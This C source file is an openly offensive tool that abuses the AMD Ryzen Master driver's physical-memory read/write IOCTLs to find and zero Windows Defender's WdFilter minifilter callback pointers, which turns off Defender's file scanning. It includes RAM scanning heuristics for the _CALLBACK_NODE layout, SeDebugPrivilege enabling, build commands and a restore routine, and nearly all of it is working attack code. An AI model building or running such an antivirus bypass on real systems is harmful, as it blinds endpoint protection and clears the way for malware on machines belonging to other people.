/*
 * flt_bypass.c — Zero WdFilter MiniFilter PreOp/PostOp Callbacks
 *
 * Primitive: AMDRyzenMasterDriverV20 physical R/W (UC → DRAM direct)
 *
 * Why the first version caused BSOD:
 *   Validation only checked "is it a kernel VA?" — extremely common in
 *   kernel pool. Got 256 false positives (hit MAX_FLT_CBS), zeroed random
 *   kernel pointers, instant NULL-deref BSOD.
 *
 * Fix — two-stage false-positive elimination:
 *
 *   Stage 1 (per-node, in scan loop):
 *     a) PreOperation must be in WdFilter VA range               (as before)
 *     b) Flink/Blink/Filter must be kernel VAs                   (as before)
 *     c) PreOperationFlag byte at node+0x1c MUST be 1            ← KEY FIX
 *        This byte is set by fltmgr when a PreOp callback is registered.
 *        Probability a random byte == 1: 1/256 ≈ 0.4%.
 *        Combined with other checks → false-positive rate near zero.
 *     d) PostOperationFlag byte at node+0x1d must be 0 or 1,
 *        consistent with whether PostOperation pointer is NULL
 *     e) NodeTypeFlags ULONG at node+0x18 must be 1 or 3
 *        (bit0=HasPreOp, bit1=HasPostOp; no other bits expected)
 *
 *   Stage 2 (post-scan, filter consistency):
 *     All legitimate WdFilter _CALLBACK_NODEs share ONE _FLT_FILTER pointer
 *     (WdFilter registers once → one _FLT_FILTER object).
 *     Find the most-frequent filter value; discard nodes that differ.
 *     If no majority exists → all are false positives → abort.
 *
 * Safety hard limit: refuse to zero > 32 nodes (normal systems: 10-20).
 *
 * _CALLBACK_NODE layout (fltmgr.sys, Win10 19041 – Win11 22631+):
 *   +0x00  CallbackLinks.Flink    kernel VA
 *   +0x08  CallbackLinks.Blink    kernel VA
 *   +0x10  Filter                 kernel VA (_FLT_FILTER*)
 *   +0x18  NodeTypeFlags          ULONG  (1=hasPreOp, 3=hasBoth)
 *   +0x1c  PreOperationFlag       UCHAR  (1 if PreOp registered)
 *   +0x1d  PostOperationFlag      UCHAR  (1 if PostOp registered)
 *   +0x1e  padding                2 bytes
 *   +0x20  PreOperation           fn ptr  ← ANCHOR / zero target
 *   +0x28  PostOperation          fn ptr or NULL  ← zero target
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o flt_bypass.exe flt_bypass.c \
 *       -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver ──────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)
                == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){
            sz=vd; break;
        }
        free(buf); buf = NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){ free(buf); return; }
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt && g_nranges<MAX_RANGES; i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base &&
            pa + sz <= g_ranges[i].base + g_ranges[i].size) return 1;
    return 0;
}

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz); if (!out) return 0;
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              in_buf, sizeof(in_buf), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out); return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf); return ok;
}

static int phys_write_v(uint64_t pa, const void *data, uint32_t sz)
{
    if (!phys_write(pa, data, sz)) return 0;
    uint8_t buf[8] = {0};
    uint32_t vsz = sz < 8 ? sz : 8;
    if (!phys_read(pa, buf, vsz)) return 0;
    return memcmp(buf, data, vsz) == 0;
}

/* ── Cache eviction — multi-CCD ──────────────────────────────────────── */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict(void)
{
    volatile uint8_t *p = (volatile uint8_t*)
        VirtualAlloc(NULL, EVICT_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!p){ Sleep(100); return; }
    for (size_t i = 0; i < EVICT_SIZE; i += 64) p[i] = (uint8_t)(i>>6);
    volatile uint64_t s = 0;
    for (size_t i = EVICT_SIZE; i >= 64; i -= 64) s ^= p[i-64];
    (void)s;
    VirtualFree((LPVOID)p, 0, MEM_RELEASE);
    Sleep(10);
}

static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD ncpu = si.dwNumberOfProcessors;
    HANDLE thr  = GetCurrentThread();
    DWORD_PTR orig = SetThreadAffinityMask(thr, 1);
    SetThreadAffinityMask(thr, 1ULL);               Sleep(1); cache_evict();
    if (ncpu > 1){
        SetThreadAffinityMask(thr, (DWORD_PTR)1 << (ncpu-1)); Sleep(1); cache_evict();
    }
    SetThreadAffinityMask(thr, orig);
}

/* ── Module list ─────────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase, ImageBase;
    ULONG  ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz = 0x80000; MOD_LIST *ml = NULL; NTSTATUS st;
    do { free(ml); ml = (MOD_LIST*)malloc(sz *= 2); st = fn(11,ml,sz,NULL); }
    while (st == (NTSTATUS)0xC0000004L);
    if (st){ free(ml); return NULL; }
    return ml;
}

static int get_module_range(const char *name, uint64_t *base, uint64_t *size)
{
    MOD_LIST *ml = get_module_list(); if (!ml) return 0;
    for (ULONG i = 0; i < ml->NumberOfModules; i++){
        char *fn = ml->Modules[i].FullPathName + ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn, name) == 0){
            *base = (uint64_t)ml->Modules[i].ImageBase;
            *size = ml->Modules[i].ImageSize;
            free(ml); return 1;
        }
    }
    free(ml); return 0;
}

/* ════════════════════════════════════════════════════════════════════════
 * _CALLBACK_NODE scan
 *
 * KEY CHECKS (anchor = +0x20, primary layout):
 *   off - 0x20  = Flink             kernel VA
 *   off - 0x18  = Blink             kernel VA
 *   off - 0x10  = Filter            kernel VA
 *   off - 0x08  = NodeTypeFlags     ULONG: must be 1 or 3
 *   off - 0x04  = PreOperationFlag  UCHAR: MUST be 1   ← strongest filter
 *   off - 0x03  = PostOperationFlag UCHAR: 0 or 1, consistent with postop
 *   off + 0x00  = PreOperation      ← ANCHOR (in WdFilter VA range)
 *   off + 0x08  = PostOperation     NULL or kernel VA
 *
 * NodeTypeFlags:
 *   bit 0 = HasPreOperation  (1 = yes)
 *   bit 1 = HasPostOperation (2 = yes)
 *   So: 1 (PreOnly) or 3 (Both). Value 2 (PostOnly) is theoretically
 *   possible but we're anchoring on PreOp so we won't see it here.
 *
 * Cross-chunk note: nodes spanning a 64KB boundary are missed (~0.1%
 * probability per node). Acceptable given the low expected node count.
 * ════════════════════════════════════════════════════════════════════════ */

#define CHUNK        0x10000
#define MAX_RAW_CBS  1024    /* collect up to this before filtering         */
#define MAX_FLT_CBS  32      /* safety hard-limit after filtering            */

static uint8_t g_chunk[CHUNK];

typedef struct {
    uint64_t preop_pa;    /* PA of PreOperation field                       */
    uint64_t postop_pa;   /* PA of PostOperation field                      */
    uint64_t preop;       /* original PreOperation value                    */
    uint64_t postop;      /* original PostOperation (may be 0)              */
    uint64_t filter;      /* Filter pointer — used for consistency check    */
} FltNode;

/* Global state for Ctrl+C handler */
static FltNode  g_nodes[MAX_FLT_CBS];
static int      g_n_nodes  = 0;
static volatile int g_zeroed = 0;

static void do_restore(void)
{
    uint8_t zero8[8] = {0};
    for (int i = 0; i < g_n_nodes; i++){
        uint8_t cur[8] = {0};
        /* Only write back if the field currently holds our zero             */
        if (phys_read(g_nodes[i].preop_pa, cur, 8) &&
            memcmp(cur, zero8, 8) == 0)
            phys_write(g_nodes[i].preop_pa, &g_nodes[i].preop, 8);

        if (g_nodes[i].postop){
            if (phys_read(g_nodes[i].postop_pa, cur, 8) &&
                memcmp(cur, zero8, 8) == 0)
                phys_write(g_nodes[i].postop_pa, &g_nodes[i].postop, 8);
        }
    }
    cache_evict_multiccd();
    g_zeroed = 0;
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if (ev==CTRL_C_EVENT || ev==CTRL_BREAK_EVENT ||
        ev==CTRL_CLOSE_EVENT || ev==CTRL_LOGOFF_EVENT ||
        ev==CTRL_SHUTDOWN_EVENT)
    {
        if (g_zeroed){
            printf("\n[!] %s — emergency restore...\n",
                   ev==CTRL_C_EVENT ? "Ctrl+C" : "shutdown");
            fflush(stdout);
            do_restore();
            printf("[+] Restored.\n"); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

/* Validate and record one candidate node. Returns 1 if accepted. */
static int try_node(uint64_t cpa, uint64_t off, uint64_t csz,
                    uint64_t wdf_base, uint64_t wdf_size,
                    FltNode raw[], int *n_raw)
{
    /* Anchor = +0x20 (primary layout only — most reliable).
     * Need 0x20 bytes before off and 0x10 after.                           */
    if (off < 0x20 || off + 0x10 > csz) return 0;

    uint64_t preop = *(uint64_t*)(g_chunk + off);
    if (preop < wdf_base || preop >= wdf_base + wdf_size) return 0;

    uint64_t flink  = *(uint64_t*)(g_chunk + off - 0x20);
    uint64_t blink  = *(uint64_t*)(g_chunk + off - 0x18);
    uint64_t filter = *(uint64_t*)(g_chunk + off - 0x10);
    uint32_t flags  = *(uint32_t*)(g_chunk + off - 0x08);
    uint8_t  pre_f  = *(uint8_t* )(g_chunk + off - 0x04);
    uint8_t  post_f = *(uint8_t* )(g_chunk + off - 0x03);
    uint64_t postop = *(uint64_t*)(g_chunk + off + 0x08);

    /* ── Checks ── */
    if (flink  < 0xFFFF800000000000ULL) return 0;
    if (blink  < 0xFFFF800000000000ULL) return 0;
    if (filter < 0xFFFF800000000000ULL) return 0;

    /* NodeTypeFlags: only bits 0 and 1 are valid; no other bits expected.
     * We have a PreOp anchor → bit0 must be set → flags ∈ {1, 3}.         */
    if (flags != 1 && flags != 3) return 0;

    /* PreOperationFlag MUST be 1 (fltmgr sets this when PreOp registered).
     * This is the STRONGEST single filter — reduces false positives ~256×. */
    if (pre_f != 1) return 0;

    /* PostOperationFlag: boolean, must match whether postop ptr is set.    */
    if (post_f > 1) return 0;
    if (postop == 0 && post_f != 0) return 0;
    if (postop != 0 && post_f != 1) return 0;

    /* PostOp: NULL or any kernel VA (WdFilter or helper module)            */
    if (postop && postop < 0xFFFF800000000000ULL) return 0;

    /* List pointers must not alias the function pointer                    */
    if (flink==preop || blink==preop || filter==preop) return 0;

    /* Check flags field is internally consistent with flag bytes           */
    uint8_t pre_bit  = (uint8_t)(flags & 1);
    uint8_t post_bit = (uint8_t)((flags >> 1) & 1);
    if (pre_bit  != pre_f)  return 0;
    if (post_bit != post_f) return 0;

    uint64_t preop_pa = cpa + off;
    for (int d = 0; d < *n_raw; d++)
        if (raw[d].preop_pa == preop_pa) return 0; /* dedup */

    if (*n_raw >= MAX_RAW_CBS) return 0;
    raw[*n_raw].preop_pa  = preop_pa;
    raw[*n_raw].postop_pa = cpa + off + 0x08;
    raw[*n_raw].preop     = preop;
    raw[*n_raw].postop    = postop;
    raw[*n_raw].filter    = filter;
    (*n_raw)++;
    return 1;
}

static void scan_flt_nodes_raw(uint64_t wdf_base, uint64_t wdf_size,
                               FltNode raw[], int *n_raw)
{
    *n_raw = 0;
    uint64_t last_prog = 0;

    for (int ri = 0; ri < g_nranges; ri++){
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < end; cpa += CHUNK){
            if (*n_raw >= MAX_RAW_CBS) goto done;
            if (cpa - last_prog >= 0x80000000ULL){
                printf("  [%5llu MB] candidates=%d\n",
                       (unsigned long long)(cpa>>20), *n_raw);
                last_prog = cpa;
            }
            uint64_t csz = end-cpa; if (csz>CHUNK) csz=CHUNK;
            if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;

            for (uint64_t off = 0x20; off < csz && *n_raw < MAX_RAW_CBS; off += 8)
                try_node(cpa, off, csz, wdf_base, wdf_size, raw, n_raw);
        }
    }
done:;
}

/* ── Stage 2: filter consistency ────────────────────────────────────────
 * All real WdFilter _CALLBACK_NODEs share ONE _FLT_FILTER object.
 * Find the most frequent 'filter' value; keep only those nodes.
 * If the winner has ≤1 vote (all unique) → everything is a false positive.
 * ──────────────────────────────────────────────────────────────────────── */
static int filter_by_consistency(FltNode raw[], int n_raw,
                                 FltNode out[], int max_out)
{
    if (n_raw == 0) return 0;

    /* Build frequency table */
    typedef struct { uint64_t val; int cnt; } Entry;
    Entry freq[MAX_RAW_CBS]; int nf = 0;
    memset(freq, 0, sizeof(freq));

    for (int i = 0; i < n_raw; i++){
        int found = 0;
        for (int j = 0; j < nf; j++)
            if (freq[j].val == raw[i].filter){ freq[j].cnt++; found=1; break; }
        if (!found && nf < MAX_RAW_CBS){
            freq[nf].val = raw[i].filter;
            freq[nf].cnt = 1;
            nf++;
        }
    }

    /* Find most frequent */
    int best_idx = 0;
    for (int j = 1; j < nf; j++)
        if (freq[j].cnt > freq[best_idx].cnt) best_idx = j;

    uint64_t winner = freq[best_idx].val;
    int      votes  = freq[best_idx].cnt;

    printf("    Filter consistency:\n");
    printf("      Unique filter values seen: %d\n", nf);
    printf("      Most frequent: 0x%016llX  (%d/%d votes)\n",
           (unsigned long long)winner, votes, n_raw);

    if (votes <= 1){
        printf("\n    [!] No consistent filter pointer found.\n");
        printf("        All candidates may be false positives.\n");
        printf("        Aborting — NOT safe to zero.\n\n");
        return 0;
    }

    if (votes < n_raw)
        printf("      Discarding %d candidates with non-matching filter.\n",
               n_raw - votes);
    printf("\n");

    /* Copy matching nodes */
    int n_out = 0;
    for (int i = 0; i < n_raw && n_out < max_out; i++)
        if (raw[i].filter == winner)
            out[n_out++] = raw[i];

    return n_out;
}

/* ── SeDebugPrivilege ────────────────────────────────────────────────── */
static void enable_debug_privilege(void)
{
    HANDLE hTok;
    TOKEN_PRIVILEGES tp = {1};
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hTok)) return;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
    printf("[*] SeDebugPrivilege: %s\n",
           (ok && GetLastError()==0) ? "enabled" : "FAILED (run as admin)");
    CloseHandle(hTok);
}

/* ════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== WdFilter MiniFilter Callback Zero ===\n\n");

    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE){
        printf("[-] Cannot open AMD device: %lu\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n", g_nranges);
    if (g_nranges == 0){
        printf("[-] No physical ranges — check registry\n");
        CloseHandle(g_dev); return 1;
    }
    for (int i = 0; i < g_nranges; i++)
        printf("    [%d] 0x%016llX  size=0x%llX\n", i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)g_ranges[i].size);
    printf("\n");

    printf("[2] WdFilter module range...\n");
    uint64_t wdf_base = 0, wdf_size = 0;
    if (!get_module_range("WdFilter.sys", &wdf_base, &wdf_size)){
        printf("[-] WdFilter.sys not loaded\n");
        CloseHandle(g_dev); return 1;
    }
    printf("    VA=0x%016llX  size=0x%llX\n\n",
           (unsigned long long)wdf_base, (unsigned long long)wdf_size);

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* ── Stage 1: raw scan ──────────────────────────────────────────── */
    printf("[3] Scanning RAM (stage 1 — raw candidates)...\n\n");
    FltNode *raw = (FltNode*)calloc(MAX_RAW_CBS, sizeof(FltNode));
    if (!raw){ printf("[-] OOM\n"); CloseHandle(g_dev); return 1; }
    int n_raw = 0;
    scan_flt_nodes_raw(wdf_base, wdf_size, raw, &n_raw);
    printf("\n    Raw candidates: %d\n\n", n_raw);

    if (n_raw == 0){
        printf("[-] No candidates found.\n");
        printf("    Possible causes:\n");
        printf("    - WdFilter not attached to any volume\n");
        printf("    - _CALLBACK_NODE layout differs on this build\n");
        printf("    - Nodes outside scanned physical ranges\n");
        free(raw); CloseHandle(g_dev); return 1;
    }

    if (n_raw == MAX_RAW_CBS)
        printf("    [!] Hit scan cap (%d) — results may be incomplete.\n\n",
               MAX_RAW_CBS);

    /* ── Stage 2: filter consistency ───────────────────────────────── */
    printf("[3] Stage 2 — filter consistency check...\n");
    g_n_nodes = filter_by_consistency(raw, n_raw, g_nodes, MAX_FLT_CBS);
    free(raw);

    if (g_n_nodes == 0){
        CloseHandle(g_dev); return 1;
    }

    /* Safety: refuse unreasonably large result sets */
    if (g_n_nodes > MAX_FLT_CBS){
        printf("[-] Filtered count %d > hard limit %d — aborting.\n",
               g_n_nodes, MAX_FLT_CBS);
        printf("    Diagnosis likely wrong; NOT safe to zero.\n");
        CloseHandle(g_dev); return 1;
    }

    /* ── Summary ────────────────────────────────────────────────────── */
    printf("[4] Verified nodes: %d\n\n", g_n_nodes);

    /* Group by preop VA (same function = same IRP_MJ, different volumes) */
    {
        typedef struct { uint64_t va; int cnt; } G;
        G grp[32]; int ng = 0;
        for (int i = 0; i < g_n_nodes; i++){
            int found = 0;
            for (int j = 0; j < ng; j++)
                if (grp[j].va == g_nodes[i].preop){ grp[j].cnt++; found=1; break; }
            if (!found && ng < 32){ grp[ng].va=g_nodes[i].preop; grp[ng].cnt=1; ng++; }
        }
        printf("    Unique PreOp functions (= unique IRP_MJ types hooked):\n");
        for (int j = 0; j < ng; j++)
            printf("      WdFilter+0x%08llX  x%d volume instance(s)\n",
                   (unsigned long long)(grp[j].va - wdf_base), grp[j].cnt);
        printf("\n");
    }

    printf("    %-4s  %-20s  %-22s  %s\n",
           "#", "node_PA", "preop_VA", "postop");
    for (int i = 0; i < g_n_nodes; i++)
        printf("    %-4d  0x%016llX  WdFilter+0x%08llX  %s\n",
               i+1,
               (unsigned long long)(g_nodes[i].preop_pa - 0x20),
               (unsigned long long)(g_nodes[i].preop - wdf_base),
               g_nodes[i].postop ? "yes" : "null");

    printf("\n    --> Enter to zero all %d nodes (Ctrl+C aborts): ",
           g_n_nodes);
    fflush(stdout); getchar(); printf("\n");

    /* ── ZERO ───────────────────────────────────────────────────────── */
    printf("[5] Zeroing...\n\n");
    uint8_t zero8[8] = {0};
    int ok_cnt = 0, fail_cnt = 0;

    for (int i = 0; i < g_n_nodes; i++){
        int ok_pre  = phys_write_v(g_nodes[i].preop_pa,  zero8, 8);
        int ok_post = (!g_nodes[i].postop) ? 1
                    : phys_write_v(g_nodes[i].postop_pa, zero8, 8);

        printf("    [%2d] PreOp=%-4s  PostOp=%-4s  node=0x%016llX\n",
               i+1,
               ok_pre  ? "OK" : "FAIL",
               g_nodes[i].postop ? (ok_post?"OK":"FAIL") : "null",
               (unsigned long long)(g_nodes[i].preop_pa - 0x20));

        if (ok_pre) ok_cnt++; else fail_cnt++;
    }

    printf("\n    %d/%d zeroed", ok_cnt, g_n_nodes);
    if (fail_cnt) printf("  (%d FAILED)", fail_cnt);
    printf("\n\n");

    if (ok_cnt == 0){
        printf("[-] All writes failed — nothing zeroed, WdFilter still active.\n");
        CloseHandle(g_dev); return 1;
    }

    /* Cache eviction */
    printf("[6] Cache eviction (multi-CCD)... "); fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    /* Mark zeroed — Ctrl+C will now restore */
    g_zeroed = 1;

    if (fail_cnt > 0)
        printf("[!] %d node(s) still active — WdFilter partially running\n\n",
               fail_cnt);

    printf("=================================================================\n");
    printf("  WdFilter file scanning: DISABLED (%d/%d nodes zeroed)\n",
           ok_cnt, g_n_nodes);
    printf("  fltmgr reads PreOperation=NULL -> skips WdFilter on all I/O\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=================================================================\n");
    fflush(stdout); getchar(); printf("\n");

    /* ── RESTORE ─────────────────────────────────────────────────────── */
    printf("[7] Restoring...\n\n");
    do_restore();

    /* Verify */
    int v = 0;
    for (int i = 0; i < g_n_nodes; i++){
        uint8_t cur[8] = {0};
        if (phys_read(g_nodes[i].preop_pa, cur, 8) &&
            memcmp(cur, &g_nodes[i].preop, 8) == 0) v++;
    }
    printf("    Verified restored: %d/%d\n\n", v, g_n_nodes);
    printf("[+] WdFilter scanning re-enabled.\n");

    CloseHandle(g_dev);
    return 0;
}
